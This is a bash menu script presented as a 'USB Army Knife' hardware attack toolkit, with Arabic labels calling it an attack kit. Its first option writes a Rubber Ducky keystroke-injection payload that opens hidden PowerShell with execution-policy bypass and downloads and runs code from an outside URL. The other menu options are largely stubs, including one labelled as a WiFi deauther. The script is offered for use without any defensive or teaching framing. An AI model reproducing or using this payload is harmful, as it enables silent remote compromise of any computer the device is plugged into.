#!/bin/bash
# Al-Mu'izz Sovereign - USB Army Knife
# (c) 2025 Sovereign Systems
# حزمة أدوات الهجوم عبر USB والهاردوير.

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

clear
echo -e "${CYAN}================================================${NC}"
echo -e "${CYAN}       🛠️  USB ARMY KNIFE: HARDWARE ARSENAL      ${NC}"
echo -e "${CYAN}================================================${NC}"

show_menu() {
    echo -e "\n${GREEN}[ قائمة الهجوم العتادي ]:${NC}"
    echo "1) Generate Rubber Ducky Payload (Powershell Reverse Shell)"
    echo "2) Flash ESP32-Hack-Toolkit (WiFi Deauther)"
    echo "3) Configure HID Keyboard Injection"
    echo "4) Deploy USB Kill-Switch (Silk Guardian)"
    echo "q) Exit to Command Center"
}

while true; do
    show_menu
    read -p "Select module: " choice
    case $choice in
        1)
            echo "[*] Generating Ducky Script..."
            echo "DELAY 1000" > /tmp/payload.txt
            echo "GUI r" >> /tmp/payload.txt
            echo "STRING powershell -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://sov.link/s')" >> /tmp/payload.txt
            echo "ENTER" >> /tmp/payload.txt
            echo -e "${GREEN}[+] Payload saved to /tmp/payload.txt${NC}"
            ;;
        2)
            echo "[*] Initializing ESP32 Flasher..."
            python3 -m esptool --chip esp32 flash_id || echo -e "${RED}[!] No ESP32 detected.${NC}"
            ;;
        3)
            echo "[*] HID Simulation mode active."
            ;;
        4)
            echo "[*] Activating Silk Guardian..."
            python3 /opt/sovereign-ai-platform/security/blackteam/silk_guardian.py
            ;;
        q) exit 0 ;;
        *) echo -e "${RED}Invalid choice.${NC}" ;;
    esac
done
